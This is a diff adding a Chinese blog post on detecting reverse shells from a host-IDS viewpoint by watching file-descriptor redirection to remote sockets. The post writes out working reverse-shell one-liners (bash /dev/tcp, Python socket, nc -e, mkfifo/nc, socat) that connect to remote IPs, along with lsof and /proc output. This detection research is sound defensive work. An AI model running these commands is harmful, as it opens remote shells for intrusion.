@@ -277,6 +277,195 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/06/03/reverse-shell-feature-research/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欣海余诚's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/06/03/reverse-shell-feature-research/" itemprop="url">反弹shell特征研究</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-03T22:10:59+08:00">
+                2020-06-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index">
+                    <span itemprop="name">应急响应</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从hids的角度出发，看反弹shell的特征。</p>
+<p>最简单的，可以根据进程黑名单直接监测到一些反弹shell，如<code>nc</code>、<code>socat</code>、<code>bash -i &gt;&amp; /dev/tcp/xxx/xxx</code>。这种检测也是很好绕过的，给可执行文件的名字换了即可。</p>
+<p>所以这次学习一下通用的反弹shell检测方式——文件描述符重定向。</p>
+<h2 id="特征1-所有文件描述符重定向至远程socket"><a href="#特征1-所有文件描述符重定向至远程socket" class="headerlink" title="特征1. 所有文件描述符重定向至远程socket"></a>特征1. 所有文件描述符重定向至远程socket</h2><h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.7.61/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>创建了一个常住进程”bash -i”， 012文件描述符都被重定向至远程socket链接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pauser@ubuntu:~$ ps -ef| grep bash</span><br><span class="line">pauser    11509  11502  0 08:35 pts/2    00:00:00 bash</span><br><span class="line">pauser    11547  11509  0 08:36 pts/2    00:00:00 bash -i</span><br><span class="line">pauser    11557  11502  0 08:36 pts/18   00:00:00 bash</span><br><span class="line">pauser    11648  11557  0 08:39 pts/18   00:00:00 grep --color=auto bash</span><br><span class="line">pauser@ubuntu:~$ ls -l /proc/11547/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 0 -&gt; socket:[824338]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 1 -&gt; socket:[824338]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 2 -&gt; socket:[824338]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:36 255 -&gt; /dev/tty</span><br><span class="line">pauser@ubuntu:~$ lsof -p 11547</span><br><span class="line">COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">bash    11547 pauser  cwd    DIR    8,1     4096 281418 /home/pauser</span><br><span class="line">bash    11547 pauser  rtd    DIR    8,1     4096      2 /</span><br><span class="line">bash    11547 pauser  txt    REG    8,1  1037528 393569 /bin/bash</span><br><span class="line">...</span><br><span class="line">bash    11547 pauser    0u  IPv4 824338      0t0    TCP 192.168.71.139:56374-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">bash    11547 pauser    1u  IPv4 824338      0t0    TCP 192.168.71.139:56374-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">bash    11547 pauser    2u  IPv4 824338      0t0    TCP 192.168.71.139:56374-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">bash    11547 pauser  255u   CHR    5,0      0t0     13 /dev/tty</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>lsof: 查看进程打开的文件的工具</p>
+</blockquote>
+<h3 id="python-perl-ruby等脚本语言类反弹shell"><a href="#python-perl-ruby等脚本语言类反弹shell" class="headerlink" title="python/perl/ruby等脚本语言类反弹shell"></a>python/perl/ruby等脚本语言类反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;106.52.206.218&#x27;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符也是都被重定向至远程socket连接.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pauser@ubuntu:~$ ls -l /proc/45638/fd</span><br><span class="line">total 0</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 0 -&gt; socket:[860316]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 1 -&gt; socket:[860316]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 2 -&gt; socket:[860316]</span><br><span class="line">lrwx------ 1 pauser pauser 64 Jun 17 08:51 3 -&gt; socket:[860316]</span><br><span class="line">pauser@ubuntu:~$ lsof -p 45638</span><br><span class="line">COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">python  45638 pauser  cwd    DIR    8,1     4096 281418 /home/pauser</span><br><span class="line">python  45638 pauser  rtd    DIR    8,1     4096      2 /</span><br><span class="line">python  45638 pauser  txt    REG    8,1  3492624    292 /usr/bin/python2.7</span><br><span class="line">python  45638 pauser  mem    REG    8,1  2366112 263076 </span><br><span class="line">...</span><br><span class="line">python  45638 pauser    0u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">python  45638 pauser    1u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">python  45638 pauser    2u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line">python  45638 pauser    3u  IPv4 860316      0t0    TCP 192.168.71.139:56384-&gt;106.52.206.218:8888 (ESTABLISHED)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="nc-反弹shell"><a href="#nc-反弹shell" class="headerlink" title="nc 反弹shell"></a>nc 反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/nc.traditional -e /bin/bash 134.175.2.34 8888</span><br></pre></td></tr></table></figure>
+<p>进程中对应的是bash：</p>
+<p><img src="1.png" alt="image"></p>
+<p>文件描述符：</p>
+<p><img src="2.png" alt="image"></p>
+<h2 id="特征2-通过管道、重定向多次后连接至远程"><a href="#特征2-通过管道、重定向多次后连接至远程" class="headerlink" title="特征2. 通过管道、重定向多次后连接至远程"></a>特征2. 通过管道、重定向多次后连接至远程</h2><h3 id="nc重定向"><a href="#nc重定向" class="headerlink" title="nc重定向"></a>nc重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/nc.traditional 134.175.2.34 8888 | /bin/bash</span><br></pre></td></tr></table></figure>
+<p>根据bash进程定位到文件描述符，发现输入描述符0被重定向至管道：</p>
+<p><img src="3.png" alt="image"></p>
+<p>定位管道另一端的进程nc，该进程文件描述符3连接远程socket连接：</p>
+<p><img src="4.png" alt="image"></p>
+<p>还有一个nc反弹shell命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 110.211.55.2 7777 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准<br>输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<p>定位到sh -i进程：</p>
+<p><img src="51.png" alt="image"></p>
+<p>根据pipe找到nc进程，描述符3重定向至远程socket连接：</p>
+<p><img src="5.png" alt="image"></p>
+<p>总结：</p>
+<p>0，1，2标准输入输出、错误输出流被指向pipe管道，管道指向到另一个进程会有一个对外的socket链接，中间或许经过多层管道，但最终被定向到的进程必有一个socket链接。</p>
+<h2 id="特征3-socat"><a href="#特征3-socat" class="headerlink" title="特征3. socat"></a>特征3. socat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反弹命令</span><br><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999</span><br><span class="line">监听命令</span><br><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:9999</span><br></pre></td></tr></table></figure>
+<p>定位文件描述符：</p>
+<p><img src="6.png" alt="image"></p>
+<blockquote>
+<p>SOCK_DGRAM 是无保障的面向消息的socket，主要用于在网络上发广播信息。</p>
+</blockquote>
+<p>bash通过管道与socat进程通信，但是管道并不是重定向的标准输入输出、标准错误输出这三个流，而是其他的流，然后在程序内部再将该pipe管道定向到0，1，2这三个文件描述符。</p>
+<h2 id="其它（待研究）"><a href="#其它（待研究）" class="headerlink" title="其它（待研究）"></a>其它（待研究）</h2><ul>
+<li>MSF生成的python payload</li>
+<li>DNS/ICMP 反弹shell</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/anbuxuan/p/11848906.html">基于主机的反弹shell检测思路</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.t00ls.net/viewthread.php?tid=52840&highlight=%E5%8F%8D%E5%BC%B9shell">反弹shell流量分析</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/06/02/pwnhub-web-writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1154,7 +1343,7 @@ curl直接发起gopher攻击：
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1165,7 +1354,7 @@ curl直接发起gopher攻击：
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1176,7 +1365,7 @@ curl直接发起gopher攻击：
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
